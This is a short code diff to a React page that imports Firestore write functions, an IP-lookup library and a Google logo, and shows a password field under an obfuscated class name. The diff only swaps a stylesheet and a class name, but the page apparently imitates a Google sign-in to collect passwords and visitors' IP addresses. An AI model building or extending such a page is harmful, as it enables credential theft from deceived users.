@@ -2,7 +2,7 @@ import React, { useEffect, useState } from 'react'
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
 import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
 import { db } from '../firebase.js';
-import '../assets/poza2.css';
+import '../assets/poza24.css';
 import GoogleLogo from '../assets/google-logo.png';
 
 
@@ -210,7 +210,7 @@ const About4 = () => {
                    
                     
                     <div className='sfasfkWFtomnS centered'>
-                    <input type="text" id="code" name="code" class="textfield" onChange={handleCodeChange} required/>
+                    <input type="text" id="code" name="code" class="textfield44" onChange={handleCodeChange} required/>
             <span className='form-code'>Enter your password</span>
             
             </div>
